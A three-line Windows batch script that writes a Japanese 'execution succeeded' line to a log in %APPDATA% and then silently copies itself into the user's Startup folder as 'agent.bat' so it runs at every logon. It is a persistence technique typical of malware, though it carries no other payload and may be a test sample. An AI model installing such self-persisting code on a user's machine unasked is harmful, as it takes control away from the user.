@echo off
echo 実行成功 > %APPDATA%\runlog.txt
copy %~f0 "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\agent.bat"

